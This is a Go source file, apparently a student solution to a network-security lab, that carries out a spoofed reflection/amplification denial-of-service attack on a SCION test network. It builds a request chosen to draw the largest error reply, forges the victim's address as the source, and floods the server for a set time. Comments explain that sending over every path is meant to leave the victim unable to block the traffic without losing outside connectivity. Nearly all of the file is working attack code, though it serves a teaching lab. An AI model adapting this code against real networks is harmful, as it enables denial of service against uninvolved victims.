package client

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	//"reflect"
	"time"
	//"github.com/netsec-ethz/scion-apps/pkg/appnet"


	// Unused imports are commented because Golang inhibits you from building the package
	// if any of these are around.

	"student.ch/netsec/isl/attack/help"
	"student.ch/netsec/isl/attack/meow"

	// These imports were used to solve this task.
	// There are multiple ways of implementing the reflection. You can use
	// anything additional from the scion codebase and might not need all of
	// the listed imports below. But these should help you limit the scope and
	// can be a first starting point for you to get familiar with the options.
	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/common"
	"github.com/scionproto/scion/go/lib/l4"
	"github.com/scionproto/scion/go/lib/sciond"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	"github.com/scionproto/scion/go/lib/spath"
)

func GenerateAttackPayload() []byte {
	//we on purpose choose an undefined query as the error message is the heaviest message in byteload
	var q meow.Query = "8"

	request := meow.NewRequest(q, meow.AddFlag("debug"))
	meow.SetID(1)(request)

	d, err := json.Marshal(request)
	if err != nil {
		fmt.Println(err)
		return make([]byte, 0) // empty paiload on fail
	}
	return d
}



// serverAddr: The server IP addr and port in the form: ISD-IA,IP:port
// spoofed addr: The spoofed return address in the form: ISD-IA,IP:port
func Attack(ctx context.Context, serverAddr string, spoofedSrc string, payload []byte) (err error) {

	//get the meow server adress
	meowServerAddr, err := snet.ParseUDPAddr(serverAddr)
	if err != nil {
		return err
	}
	//get the spoofed address (or the victim address)
	spoofedAddr, err := snet.ParseUDPAddr(spoofedSrc)
	if err != nil {
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	dispSockPath, err := help.ParseDispatcherSocketFromConfig()
	if err != nil {
		return err
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	//SCION deamon
	sciondAddr, err := help.ParseSCIONDAddrFromConfig()
	if err != nil {
		return err
	}
	sciondConn, err := sciond.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		return err
	}
	//We ultimately want to establish a network
	//based on the code in
	//https://github.com/netsec-ethz/scion-apps/blob/260d0fa91bd8f2c2e37c3eb16026cb772e80ed36/pkg/appnet/appnet.go#L172
	//we define LocalIA, pathQuerier and the network n
	localIA, err := sciondConn.LocalIA(ctx)
	if err != nil {
		return err
	}
	pathQuerier := sciond.Querier{Connector: sciondConn, IA: localIA}


	n := snet.NewNetworkWithPR(
		localIA,
		dispatcher,
		pathQuerier,
		sciond.RevHandler{Connector: sciondConn}, )


	//case destinction if the victim is in the same AS as the meow server
	//or if they are in different AS's.
	if spoofedAddr.IA != meowServerAddr.IA {
		//find the paths.
		paths, err := sciondConn.Paths(ctx, spoofedAddr.IA, meowServerAddr.IA, sciond.PathReqFlags{})
		var our_paths []*spath.Path

		for i:=0; i< len(paths); i++{
			curr_path := paths[i].Path()
			curr_path.Reverse()
			our_paths = append(our_paths, curr_path)
		}

		//establish the connection
		conn, err := n.Dial(ctx, "udp", spoofedAddr.Host, meowServerAddr, addr.SvcNone)

		if err != nil {
			fmt.Println("CLIENT: Dial produced an error.", err)
		}

		//create the packet
		pkt := &snet.Packet{
			Bytes: snet.Bytes(*conn.Buffer()),
			PacketInfo: snet.PacketInfo{
				Destination: snet.SCIONAddress{IA: meowServerAddr.IA,
					Host: addr.HostFromIPStr(meow.SERVER_IP)},
				Source: snet.SCIONAddress{IA: spoofedAddr.IA,
					Host: addr.HostFromIPStr(VICTIM_IP)},
				Path:nil,
				L4Header: &l4.UDP{
					SrcPort:  uint16(help.LoadVictimPort()),
					DstPort:  uint16(meow.SERVER_PORTS[0]),
					TotalLen: uint16(l4.UDPLen + len(payload)),
				},
				Payload: common.RawBytes(payload),
			},
		}
		//establish the packet connection
		packetConn := *conn.Conn()
		//fmt.Println(reflect.TypeOf(pkt))
		//fmt.Println("packetConn", packetConn)
		defer conn.Close()

        //IDEA: we want to send packets to the victim over all the paths leading to the victim, such that the
        //victim does not know which path it should block. In order for the victim not to receive malicious packets
        //it needs to block all the paths and will not be able to communicate outside of the AS anymore.
        var i = 0
		for start := time.Now(); time.Since(start) < ATTACK_TIME; {
			//if we have send packets over all the paths but we are still within the attack time
			//start sending over the first path again
			if i == len(our_paths){
				i = 0
			}
			pkt.Path = our_paths[i]
			i++
			if err := packetConn.WriteTo(pkt, &net.UDPAddr{IP: meowServerAddr.Host.IP, Port: help.DISPATCHER_PORT}); err != nil {
				fmt.Println("CLIENT: Write produced an error.", err)
				return err
			}

		}
		return nil

	} else {
		//now we know that we are in the same AS so we do not have to define the paths
		//therefore we can use the write function instead of the write to function as
		//defined in : https://github.com/netsec-ethz/scion-apps/blob/260d0fa91bd8f2c2e37c3eb16026cb772e80ed36/pkg/appnet/appnet.go#L172
		conn, err := n.Dial(ctx, "udp", spoofedAddr.Host, meowServerAddr, addr.SvcNone)

		if err != nil {
			fmt.Println("CLIENT: Dial produced an error.", err)
		}

		defer conn.Close()

		for start := time.Now(); time.Since(start) < ATTACK_TIME; {
			bitn, err := conn.Write(payload)
			if err != nil {
				fmt.Println("CLIENT: Write produced an error.", err)
			}
			fmt.Printf("CLIENT: Packet-written: bytes=%d addr=%s\n", bitn, serverAddr)

		}

		return nil

	}
}